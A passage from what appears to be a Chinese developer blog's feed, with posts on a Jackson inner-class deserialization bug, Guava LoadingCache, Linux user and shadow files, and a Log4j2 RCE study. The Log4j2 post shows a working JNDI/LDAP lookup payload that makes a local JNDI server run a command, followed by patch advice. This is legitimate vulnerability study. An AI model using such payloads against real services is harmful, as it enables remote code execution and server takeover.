    <content type="html"><![CDATA[<p>同事在写一个很简单的，从配置中心读取一个JSON，然后转换为服务内部的一个实体类的方法。这样的代码，想必大家已近烂熟于心了。但是那天，我同事写的这段代码却死也跑不起来，原因在于使用 jackson 反序列化 JSON 的过程中，无论如何返回的都是一个空对象。我和同事老哥看了半天，仔仔细细对了字段名是不是正确，从配置中心拉下来的配置是不是下划线命名了，有没有奇怪的注解等等，看了半天依旧没有看出问题。</p><span id="more"></span><h2 id="排查"><a class="markdownIt-Anchor" href="#排查"></a> 排查</h2><p>同事写的那段获取配置，并进行一些处理的代码，大概长这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JacksonInnerClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">someMethod</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Person person = ConfigUtils.getJsonProperty(<span class="string">&quot;server.person_config&quot;</span>, Person.class); <span class="comment">// 返回null</span></span><br><span class="line">        <span class="comment">// do something with person</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> height;</span><br><span class="line">        <span class="keyword">int</span> weight;</span><br><span class="line">        String name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ConfigUtils 是一个工具类，会从服务器获取 <code>server.person_config</code> 这个配置并且用 jackson 反序列化为对象。看起来毫无问题，但是无论如何 person 永远是<code>null</code>。<br />我平时写代码的时候不喜欢写内部类，遇到这种配置的映射类，我都会单独写在 <code>dto</code> 或者 <code>vo</code> 包里，联想到内部类可能有一些隐藏的属性，我吧Person这个类单独提取了出来，再debug，结果一遍通过，反序列化成功。</p><h2 id="原因"><a class="markdownIt-Anchor" href="#原因"></a> 原因</h2><p>一番搜索后，通过 <a href="http://www.cowtowncoder.com/blog/archives/2010/08/entry_411.html">这篇文章</a> 了解到。Java 的非静态内部类，是可以访问外部类的私有成员变量的。为了实现这一点，Java在编译时，会给内部类添加一个传入外部类的构造方法。这就会导致内部类没有无参构造方法，导致 jackson 无法实例化对象。jackson 内部会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">non-static inner classes like this can only by instantiated using default, no-argument constructor</span><br></pre></td></tr></table></figure><p>我这里写了一个测试类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">someMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String json = <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;weight\&quot;: 40,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;height\&quot;: 160,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;name\&quot;: \&quot;frank\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        Person person = JsonUtils.fromJson(json, Person.class);</span><br><span class="line">        System.out.println(person.getHeight());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Data</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> height;</span><br><span class="line">        <span class="keyword">int</span> weight;</span><br><span class="line">        String name ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Test test = <span class="keyword">new</span> Test();</span><br><span class="line">        test.someMethod();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译过后，这个类会生成两个 <code>.class</code> 文件</p><p><img src="https://cdn.jsdelivr.net/gh/VirgilChen97/image-host@master/images/image.5nncm9xj5c40.webp" alt="" /></p><p>反编译 <code>Test$Person</code> 得到如下结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Test$Person &#123;</span><br><span class="line">   int height;</span><br><span class="line">   int weight;</span><br><span class="line">   String name;</span><br><span class="line">   // $FF: synthetic field</span><br><span class="line">   final Test this$0;</span><br><span class="line"></span><br><span class="line">   // 多出的构造方法</span><br><span class="line">   public Test$Person(Test this$0) &#123;</span><br><span class="line">      this.this$0 = this$0;</span><br><span class="line">   &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到，生成的类多出了一个入参是外部类的构造方法。注意这里，即使你自己在类中写一个无参的构造方法也是无效的，因为只要需要访问外部类，内部类中就必然要保存外部类的引用，你的无参构造方法会直接被无视掉。</p><h2 id="解决"><a class="markdownIt-Anchor" href="#解决"></a> 解决</h2><p>给内部类添加 <code>static</code> 修饰符，因为静态内部类不能访问外部类的成员变量。或者干脆不使用内部类。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;同事在写一个很简单的，从配置中心读取一个JSON，然后转换为服务内部的一个实体类的方法。这样的代码，想必大家已近烂熟于心了。但是那天，我同事写的这段代码却死也跑不起来，原因在于使用 jackson 反序列化 JSON 的过程中，无论如何返回的都是一个空对象。我和同事老哥看了半天，仔仔细细对了字段名是不是正确，从配置中心拉下来的配置是不是下划线命名了，有没有奇怪的注解等等，看了半天依旧没有看出问题。&lt;/p&gt;</summary>
    
    
    
    <category term="技术学习" scheme="https://virgilchen97.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="涨知识了" scheme="https://virgilchen97.github.io/tags/%E6%B6%A8%E7%9F%A5%E8%AF%86%E4%BA%86/"/>
    
  </entry>
  
  <entry>
    <title>Log4j2 RCE 0day漏洞学习</title>
    <link href="https://virgilchen97.github.io/2021/12/2021-12-16-14-24-08-Log4j2-RCE-0day%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>https://virgilchen97.github.io/2021/12/2021-12-16-14-24-08-Log4j2-RCE-0day%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-12-16T06:24:08.000Z</published>
    <updated>2022-01-26T13:48:51.153Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一些前置知识"><a class="markdownIt-Anchor" href="#一些前置知识"></a> 一些前置知识</h1><h3 id="1-log4j2-是什么"><a class="markdownIt-Anchor" href="#1-log4j2-是什么"></a> 1. Log4j2 是什么</h3><p>在 SpringBoot 中，我们使用lombok经常会使用 <code>@Slf4j</code> 来注入一个log对象，调用info，debug等方法来记录日志。<code>slf4j</code> 是一个日志框架，是对所有日志制定的一种规范、标准、接口，但是并没有实现任何功能。<br />而 <code>Log4j2</code> 则是 <code>slf4j</code> 这个框架的一种具体实现，他支持通过不同的 Appender 将日志记录到控制台，文件，甚至kafka。</p><h3 id="2-rce-漏洞"><a class="markdownIt-Anchor" href="#2-rce-漏洞"></a> 2. RCE 漏洞</h3><p><em>远程命令/代码执行漏洞</em>，简称RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p><h1 id="本次漏洞"><a class="markdownIt-Anchor" href="#本次漏洞"></a> 本次漏洞</h1><p><code>Log4j2</code> 在记录日志时，支持动态属性，可以将动态的替换日志中的字段为环境变量，系统属性等。官方的 <a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">Lookup文档</a> 具体的描述了支持替换属性。<br />攻击者可以通过调用接口或者是使用服务，被攻击的服务使用log4j记录包含 <code>$&#123;&#125;</code> 关键标识符的日志。触发log4j2的lookup逻辑。而 <code>jndi</code> 也是支持替换的属性之一。攻击者可以通过触发 JNDI ，通过ldap/rmi注入漏洞。成功利用此漏洞可以在目标服务器上执行任意代码。</p><h1 id="复现"><a class="markdownIt-Anchor" href="#复现"></a> 复现</h1><p>首先编写个类打印日志：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Log4j</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Logger logger = LogManager.getLogger(Log4j.class);</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:23456/Command8&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后使用su18大佬的这个 <a href="https://github.com/su18/JNDI">工具</a> ，启动一个 jndi 服务，把命令设置为打开记事本（notepad.exe）</p><p><img src="https://cdn.jsdelivr.net/gh/VirgilChen97/image-host@master/images/image.5e6keaolryc0.png" alt="" /></p><p>运行代码，果然打开了记事本</p><p><img src="https://cdn.jsdelivr.net/gh/VirgilChen97/image-host@master/images/image.2sspka176ha0.png" alt="" /></p><p>我们这里只是打开了记事本，但是攻击者可以利用这个漏洞，将自己的ssh key加入服务器的authorized_keys，删除/写入/读取服务器上的文件，危险性极高。</p><h1 id="修复"><a class="markdownIt-Anchor" href="#修复"></a> 修复</h1><p>尽快将log4j升级为<code>2.15.0-rc2</code>之后的版本，官方在新版本中默认禁用了 JNDI lookup 功能。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一些前置知识&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#一些前置知识&quot;&gt;&lt;/a&gt; 一些前置知识&lt;/h1&gt;
&lt;h3 id=&quot;1-log4j2-是什么&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-log</summary>
      
    
    
    
    <category term="技术学习" scheme="https://virgilchen97.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="漏洞" scheme="https://virgilchen97.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>LoadingCache 本地缓存</title>
    <link href="https://virgilchen97.github.io/2021/08/2021-08-19-06-56-27-LoadingCache-%E6%9C%AC%E5%9C%B0%E7%BC%93%E5%AD%98/"/>
    <id>https://virgilchen97.github.io/2021/08/2021-08-19-06-56-27-LoadingCache-%E6%9C%AC%E5%9C%B0%E7%BC%93%E5%AD%98/</id>
    <published>2021-08-18T22:56:27.000Z</published>
    <updated>2022-01-26T13:48:51.153Z</updated>
    
    <content type="html"><![CDATA[<p>在项目开发中的时候，经常会遇到：</p><ol><li>服务访问频率较高，但是依赖服务无法承受较高qps，或是依赖服务有较大时延</li><li>部分复杂配置仅需要偶尔获取即可，只在Bean加载时读取配置，想要让新的配置生效必须重启服务</li><li>其他对于数据时效性要求不高的情况</li></ol><p>在我的开发过程中遇到的情况是，我开发的服务A要通过服务B获取配置来生成动态一些数据，服务B的配置随时可能被修改。如果生成数据每一条数据的时候都去调用一次服务B，对于服务B的压力过大，每次HTTP请求也会影响生成数据的性能。但是如果每次仅在Bean加载的时候获取服务器配置，会导致服务B上发生的配置修改在我这里无效。</p><p>这时，我们就想到了要使用缓存。说到缓存，大家第一个想到的就是大名鼎鼎的 Redis，但是对于某些小型服务，为了缓存就直接引入一个Redis服务器显然是不明智的。为了解决这个问题，Guava中为我们提供了一种本地缓存的解决方案——<code>LoadingCache</code>。</p><span id="more"></span><h2 id="loadingcache-接口"><a class="markdownIt-Anchor" href="#loadingcache-接口"></a> LoadingCache 接口</h2><p>先让我们来看下LoadingCahce接口的接口定义，让我们对这个工具有一个清楚的认知</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">LoadingCache</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">Cache</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt;, <span class="title">Function</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">   <span class="function">V <span class="title">get</span><span class="params">(K key)</span> <span class="keyword">throws</span> ExecutionException</span>;</span><br><span class="line">   <span class="function">V <span class="title">getUnchecked</span><span class="params">(K key)</span></span>;</span><br><span class="line">   <span class="function">ImmutableMap&lt;K, V&gt; <span class="title">getAll</span><span class="params">(Iterable&lt;? extends K&gt; keys)</span> <span class="keyword">throws</span> ExecutionException</span>;</span><br><span class="line">   <span class="function">V <span class="title">apply</span><span class="params">(K key)</span></span>;</span><br><span class="line">   <span class="function"><span class="keyword">void</span> <span class="title">refresh</span><span class="params">(K key)</span></span>;</span><br><span class="line">   <span class="function">ConcurrentMap&lt;K, V&gt; <span class="title">asMap</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中比较重要的有</p><ul><li><code>V get(K key)</code> 通过 <code>key</code> 获取 value, 如果通过此key获取不到对应的value，则通过定义的 <code>CacheLoader</code> 的 <code>load</code> 方法原子的去载入这个 value</li><li><code>V getUnchecked(K key)</code> 与 get 基本相同，区别在定义的 <code>CacheLoader</code> 是否会抛出异常，如果不会则使用本方法</li><li><code>void refresh(K key)</code> 重新使用 <code>CacheLoader</code> 去载入这个key对应的value</li></ul><h2 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h2><p>Loading Cache使用了工厂模式来创建实例，通过 <code>CacheBuilder</code> 类，我们可以快速的创建自己需要的缓存。常用的有如下选项</p><ul><li><code>maximumSize(long)</code> 设置缓存容量的最大值，超过后，最不常用的缓存项将被清除</li><li><code>expireAfterAccess(long, TimeUnit)</code> 在给定时间内没有被读/写访问，则回收。</li><li><code>expireAfterWrite(long, TimeUnit)</code> 缓存项在给定时间内没有被写访问（创建或覆盖），则回收。</li></ul><p>在调用 <code>build()</code> 方法时，需要传入一个实现了 <code>CacheLoader</code> 接口的实例，用来定义当指定的key获取不到缓存时，如何将数据载入缓存。通常我们可以直接new接口实现一个匿名内部类。</p><p>在我的使用场景下，我希望cache中的数据在载入60秒后过期，此时重新从B服务获取配置。我就会用如下代码来新建一个 <code>LoadingCache</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> LoadingCache&lt;String, String&gt; cache = CacheBuilder.newBuilder()</span><br><span class="line">            .expireAfterWrite(<span class="number">60</span>, TimeUnit.SECONDS)</span><br><span class="line">            .build(<span class="keyword">new</span> CacheLoader&lt;String, Map&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> String <span class="title">load</span><span class="params">(String key)</span></span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> serviceBravo.queryConfig(key)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br></pre></td></tr></table></figure><p>这样，每次使用key去B服务获取配置时，cache会先检查本地是否加载，若没有加载的话就会使用我们定义的 <code>CacheLoader</code> 去B服务加载配置并返回。下一次调用若在60秒内，则会直接返回缓存的结果。若B服务的配置发生了修改，60秒过后缓存失效，便会重新获取新的配置。这样大大降低了B服务的压力，提升了本服务的性能。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在项目开发中的时候，经常会遇到：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;服务访问频率较高，但是依赖服务无法承受较高qps，或是依赖服务有较大时延&lt;/li&gt;
&lt;li&gt;部分复杂配置仅需要偶尔获取即可，只在Bean加载时读取配置，想要让新的配置生效必须重启服务&lt;/li&gt;
&lt;li&gt;其他对于数据时效性要求不高的情况&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在我的开发过程中遇到的情况是，我开发的服务A要通过服务B获取配置来生成动态一些数据，服务B的配置随时可能被修改。如果生成数据每一条数据的时候都去调用一次服务B，对于服务B的压力过大，每次HTTP请求也会影响生成数据的性能。但是如果每次仅在Bean加载的时候获取服务器配置，会导致服务B上发生的配置修改在我这里无效。&lt;/p&gt;
&lt;p&gt;这时，我们就想到了要使用缓存。说到缓存，大家第一个想到的就是大名鼎鼎的 Redis，但是对于某些小型服务，为了缓存就直接引入一个Redis服务器显然是不明智的。为了解决这个问题，Guava中为我们提供了一种本地缓存的解决方案——&lt;code&gt;LoadingCache&lt;/code&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="技术学习" scheme="https://virgilchen97.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="实用工具类" scheme="https://virgilchen97.github.io/tags/%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>Linux文件权限</title>
    <link href="https://virgilchen97.github.io/2020/11/Linux%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/"/>
    <id>https://virgilchen97.github.io/2020/11/Linux%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/</id>
    <published>2020-11-08T05:31:58.000Z</published>
    <updated>2022-01-26T13:48:43.537Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux-安全性"><a class="markdownIt-Anchor" href="#linux-安全性"></a> Linux 安全性</h1><p>Linux安全系统的核心是用户账户，用户权限是通过创建用户时分配的用户ID（UID）来跟踪的。</p><h2 id="etcpasswd-文件"><a class="markdownIt-Anchor" href="#etcpasswd-文件"></a> <code>/etc/passwd</code> 文件</h2><p>Linux系统使用一个专门的文件来将用户的登录名匹配到对应的UID值。这个文件就是 <code>/etc/passwd</code> 文件，下面是一个这个文件的例子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin   </span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin    </span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>其中，<code>root</code> 用户是系统的管理员，UID固定为0。同时Linux也会为各种各样的功能创建不同的账户，这些账户是系统账户，被各种服务进程用来访问资源，所有运行在后台的服务都需要用一个系统用户账户登录到Linux系统上。如果不考虑安全，这些服务都可以使用root账户登录。但是，如果有非授权的用户攻陷了这些服务中的一个，他立刻就能作为root用户进入系统。为了防止发生这种情况，现在运行在Linux服务器后台的几乎所有的服务都是用自己的账户登录。这样的话，即使有人攻入了某个服务，也无法访问整个系统。Linux 为系统账户预留了500以下的UID。</p><p>在 <code>passwd</code> 文件中有如下的字段，用冒号分隔：</p><ul><li>用户名</li><li>密码</li><li>UID</li><li>GID（组ID）</li><li>备注</li><li>Home目录位置</li><li>默认shell</li></ul><p>值得注意的是所有用户的密码字段都是一个 <code>x</code>，因为密码并不直接保存在 <code>passwd</code> 文件中，而是保存在 <code>/etc/shadow</code> 文件中。</p><h2 id="etcshadow-文件"><a class="markdownIt-Anchor" href="#etcshadow-文件"></a> <code>/etc/shadow</code> 文件</h2><p><code>/etc/shadow</code> 文件对Linux系统密码管理提供了更多的控制。只有root用户才能访问/etc/shadow文件，<code>/etc/shadow</code>文件为系统上的每个用户账户都保存了一条记录。如果使用普通用户查看此文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/shadow</span></span><br><span class="line">cat: /etc/shadow: Permission denied</span><br></pre></td></tr></table></figure><p>使用root用户就可以看到文件内容，下面是一个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virgil:$6$mI1pRsd/$8.4RVzKnC3O3BU2FcXmtcLC7UQa.4z6q2tYXk/u7WlFAmmHIQDmVqI7HCeiDUBL6F0ynpSIY1Z0.:18236:0:99999:7:::</span><br></pre></td></tr></table></figure><p>一共有9个字段，同样也是用冒号分隔：</p><ul><li>/etc/passwd文件中的登录名字段对应的登录名</li><li>加密后的密码</li><li>自上次修改密码后过去的天数</li><li>多少天后才能更改密码</li><li>多少天后必须更改密码</li><li>密码过期前提前多少天提醒用户更改密码</li><li>密码过期后多少天禁用用户账户</li><li>用户账户被禁用的日期</li><li>预留字段给将来使用</li></ul><h2 id="添加用户"><a class="markdownIt-Anchor" href="#添加用户"></a> 添加用户</h2><p>可以使用 <code>useradd</code> 命令添加一个新用户，通过 <code>-D</code> 参数，我们可以看到其默认值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ useradd -D</span><br><span class="line">GROUP=100 (默认添加到GID 100的公共组)</span><br><span class="line">HOME=/home (home目录位于/home/loginname)</span><br><span class="line">INACTIVE=-1 (密码过期不会被禁用)</span><br><span class="line">EXPIRE=</span><br><span class="line">SHELL=/bin/sh </span><br><span class="line">SKEL=/etc/skel (将内容复制到HOME目录下)</span><br><span class="line">CREATE_MAIL_SPOOL=no</span><br></pre></td></tr></table></figure><p>默认情况下，Ubuntu中的 <code>/etc/skel</code> 中有如下文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ls -al /etc/skel/</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec  6  2019 .</span><br><span class="line">drwxr-xr-x 106 root root 4096 Nov  8 13:17 ..</span><br><span class="line">-rw-r--r--   1 root root  220 Apr  4  2018 .bash_logout</span><br><span class="line">-rw-r--r--   1 root root 3771 Apr  4  2018 .bashrc</span><br><span class="line">-rw-r--r--   1 root root  807 Apr  4  2018 .profile</span><br></pre></td></tr></table></figure><p>如果我们现在创建一个新的用户 <code>test</code>, 默认情况下 <code>useradd</code> 不会创建用户的home目录，我们可以指定 <code>-m</code> 参数来创建：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ sudo useradd -m test</span><br><span class="line">$ ls /home</span><br><span class="line">test  virgil</span><br><span class="line">$ ls /home/test/</span><br><span class="line">$ ls -al /home/test/</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 2 test test 4096 Nov  8 15:10 .</span><br><span class="line">drwxr-xr-x 4 root root 4096 Nov  8 15:10 ..</span><br><span class="line">-rw-r--r-- 1 test test  220 Apr  4  2018 .bash_logout</span><br><span class="line">-rw-r--r-- 1 test test 3771 Apr  4  2018 .bashrc</span><br><span class="line">-rw-r--r-- 1 test test  807 Apr  4  2018 .profile</span><br></pre></td></tr></table></figure><p>可以看到用户被创建，该用户的HOME目录中也有了一份 <code>/etc/skel</code> 中文件的拷贝。注意创建用户需要使用管理员账户。</p><h2 id="删除用户"><a class="markdownIt-Anchor" href="#删除用户"></a> 删除用户</h2><p><code>userdel</code> 可以用来删除用户，默认情况下只会删除 passwd 中的用户信息，如果加上 <code>-r</code> 参数，则会删除HOME目录以及邮件目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo userdel -r <span class="built_in">test</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls /home/</span></span><br><span class="line">virgil</span><br></pre></td></tr></table></figure><h2 id="修改用户"><a class="markdownIt-Anchor" href="#修改用户"></a> 修改用户</h2><h3 id="usermod"><a class="markdownIt-Anchor" href="#usermod"></a> <code>usermod</code></h3><p>是所有修改工具最强大一个，可以修改 passwd 文件中的大部分字段：</p><ul><li><code>-l</code> 修改用户账户的登录名。</li><li><code>-L</code> 锁定账户，使用户无法登录。</li><li><code>-p</code> 修改账户的密码。</li><li><code>-U</code> 解除锁定，使用户能够登录。</li></ul><h3 id="passwd-和-chpasswd"><a class="markdownIt-Anchor" href="#passwd-和-chpasswd"></a> <code>passwd</code> 和 <code>chpasswd</code></h3><p>可以用于修改密码，任何用户都可以使用 <code>passwd</code> 修改自己的密码，只有管理员才能修改其他人的密码。当要同时修改大量用户的密码时，<code>chpasswd</code> 命令支持标准输入自动读取登录名和密码对（由冒号分割）列表。</p><h3 id="chsh-chage"><a class="markdownIt-Anchor" href="#chsh-chage"></a> <code>chsh</code>, <code>chage</code></h3><p><code>chsh</code> 可以用于更改用户的默认shell，必须填写shell可执行文件的完整路径名。<code>chage</code> 可用于修改用户账户的有效期，可以修改 <code>shadow</code> 文件的后几个和账户密码过期时间有关的参数。</p><h1 id="用户组"><a class="markdownIt-Anchor" href="#用户组"></a> 用户组</h1><p>用户账户在控制单个用户安全性方面很好用，但涉及在共享资源的一组用户时就比较麻烦了。为了解决这个问题，Linux系统采用了另外一个安全概念——组（group）。组权限允许多个用户对系统中的对象（比如文件、目录或设备等）共享一组共用的权限。同样的每个组都有一个唯一的GID。</p><h2 id="etcgroup-文件"><a class="markdownIt-Anchor" href="#etcgroup-文件"></a> <code>/etc/group</code> 文件</h2><p><code>etc/group</code> 文件包含系统上用到的每个组的信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/group</span></span><br><span class="line">root:x:0:</span><br><span class="line">daemon:x:1:</span><br><span class="line">bin:x:2:</span><br><span class="line">sys:x:3:</span><br><span class="line">adm:x:4:syslog,virgil</span><br><span class="line">tty:x:5:</span><br></pre></td></tr></table></figure><p>每个字段分别代表：</p><ul><li>组名</li><li>组密码</li><li>GID</li><li>属于该组的用户列表<ul><li><blockquote><p>在列表中，有些组并没有列出用户。 